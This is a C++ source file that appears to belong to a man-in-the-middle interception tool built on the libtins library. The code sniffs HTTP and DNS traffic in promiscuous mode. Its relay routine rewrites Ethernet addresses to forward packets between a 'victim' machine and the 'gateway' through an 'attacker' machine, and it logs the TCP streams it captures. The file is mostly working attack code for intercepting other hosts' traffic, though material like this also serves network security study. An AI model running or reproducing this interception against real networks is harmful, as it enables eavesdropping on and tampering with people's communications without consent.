/*
 * Pipe.cpp
 *
 *  Created on: 10 de ago de 2015
 *      Author: rodopoulos
 */

#include "Pipe.h"

using namespace Tins;

PacketSender 		Pipe::sender;
TCPStreamFollower	Pipe::assembler;
int			 		Pipe::count = 1;

Pipe::Pipe() {}
Pipe::~Pipe() {}

void Pipe::init(){
	sender.default_interface(Globals::iface);
	pthread_t sniffingThread;
	if(pthread_create(&sniffingThread, nullptr, connect, nullptr) < 0){
		std::cerr << "\033[1;31m [Error]"
					 " Pipe::init ->"
					 "\033[0m can't create relay thread" << std::endl;
		exit(EXIT_FAILURE);
	}
}

void* Pipe::connect(void* args){
	std::string filter = "(tcp port 80 || udp port 53 || tcp port 53)";
	Sniffer sniffer(Globals::iface.name(), MTU, Sniffer::PROMISC, filter);

	std::cout << "Relay is on." << std::endl;
	assembler.follow_streams(sniffer, tcpFollower, httpRecover);

	return nullptr;
}

bool Pipe::relay(PDU& packet){
	EthernetII ether = packet.rfind_pdu<EthernetII>();
	IP ip = packet.rfind_pdu<IP>();

	if(ether.dst_addr() == Globals::attacker.mac){
		if(ether.src_addr() == Globals::victim.mac){
			count++;
			ether.src_addr(Globals::attacker.mac);
			ether.dst_addr(Globals::gateway.mac);
			if(packet.size() <= MTU)
				std::cout << "\033[0;32m[" << count << "]victim > gateway | size: " << packet.size() << "\033[0m" << std::endl;
			else
				std::cout << "\033[1;31m[" << count << "]victim > gateway | size: " << packet.size() << "\033[0m" << std::endl;
			sender.send(ether);
		} else if(ether.src_addr() == Globals::gateway.mac && ip.dst_addr() != Globals::attacker.ip){
			ether.src_addr(Globals::attacker.mac);
			ether.dst_addr(Globals::victim.mac);
			count++;

			if(packet.size() <= MTU)
				std::cout << "\033[0;36m[" << count << "]gateway > victim | size: " << packet.size() << "\033[0m" << std::endl;
			else
				std::cout << "\033[1;31m[" << count << "]gateway > victim | size: " << packet.size() << "\033[0m" << std::endl;
			sender.send(ether);
		}
	}

	return true;
}

bool Pipe::httpRecover(TCPStream& stream){
	std::cout << "[" << stream.id() << "] "
			  << stream.stream_info().client_addr << ":" << stream.stream_info().client_port
			  << " -> " << stream.stream_info().server_addr << ":" << stream.stream_info().server_port
			  << std::endl;
	return true;
}

bool Pipe::tcpFollower(TCPStream& stream){
	std::cout << "Stream" << std::endl;
	return true;
}
